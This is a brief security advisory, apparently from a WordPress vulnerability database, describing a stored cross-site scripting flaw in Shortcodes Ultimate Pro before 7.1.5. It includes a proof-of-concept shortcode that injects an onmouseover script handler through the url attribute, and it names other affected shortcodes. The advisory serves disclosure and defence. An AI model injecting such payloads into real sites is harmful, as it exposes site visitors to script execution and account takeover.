## WordPress Plugin Vulnerabilities

# Shortcodes Ultimate Pro < 7.1.5 - Contributor+ Stored Cross-Site Scripting XSS

### Description

The plugin does not properly escape some of its shortcodes' settings, making it possible for attackers with a Contributor account to conduct Stored XSS attacks.

### Proof of Concept

[su\_icon\_panel background="1" color="1" border="1px double 1" shadow="1px 2px 0px 1" radius="18" text\_align="left" icon\_color="11" icon\_size="69" url='123"onmouseover="alert(1)"' target="blank" class="123"]Panel content123[/su\_icon\_panel]
Similar issues affect these other shortcodes: content-slider, exit\_popup, icon\_panel, member, photo\_panel, progress\_bar, progress\_pie, section, shadow, splash and testimonial;

### Affects Plugins
